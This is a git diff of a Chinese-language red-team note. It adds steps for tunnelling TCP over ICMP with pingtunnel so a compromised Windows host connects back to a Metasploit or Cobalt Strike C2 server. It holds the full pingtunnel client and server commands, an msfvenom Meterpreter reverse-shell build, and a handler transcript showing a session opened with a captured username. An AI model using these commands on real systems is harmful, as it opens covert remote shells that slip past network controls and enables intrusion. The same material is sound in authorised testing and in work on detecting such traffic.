@@ -95,7 +95,9 @@ ln -s libpcap.so.1.5.3 libpcap.so.0.8
 
 ### 1.2 pingtunnel
 
-#### 转发tcp流量
+> 下面以服务端为server，client端为windows为例（反过来无法上线，不知道为啥）
+
+#### 基础转发tcp流量
 
 简单的通过icmp隧道转发tcp流量，攻击机kali-192.168.73.98
 
@@ -122,6 +124,79 @@ ln -s libpcap.so.1.5.3 libpcap.so.0.8
 server端可以收到并解析出来
 
 ![image-20240109224633925](./img/Tunnel/image-20240109224633925.png)
+
+#### 转发TCP上线msf
+
+* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
+
+```
+./pingtunnel -type server -noprint 1 -nolog 1
+```
+
+* ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+
+```shell
+pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
+# 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
+# icmpserver_ip 192.168.1.10
+# c2_server_ip 192.168.1.10
+```
+
+生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
+
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=9999 -f exe -o meterpreter.exe
+# 这里的lhost和lport为icmp客户端监听ip和端口
+```
+
+启动msf监听，等待meterpreter执行上线
+
+```
+# 这里的lhost和lport为icmp客户端转发到的ip和端口
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 7777
+lport => 7777
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:7777 
+[*] Sending stage (200774 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.10:7777 -> 192.168.1.10:44832) at 2024-01-15 02:26:28 -0500
+
+meterpreter > getuid
+Server username: ECHO0D-WIN\echo0d
+
+```
+
+![image-20240115153402449](./img/Tunnel/image-20240115153402449.png)
+
+#### 转发TCP上线cobaltstrike
+
+* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
+
+```
+./pingtunnel -type server -noprint 1 -nolog 1
+```
+
+ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+
+```
+pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
+
+# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
+```
+
+* cobaltstrike创建listener
+  https host和https port(c2)为ICMP隧道客户端的监听IP和端口
+  https port(bind)为转发目的地址的端口
+
+* 生成反向payload的beacon
+
+* 上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线
 
 #### 流量特征
 
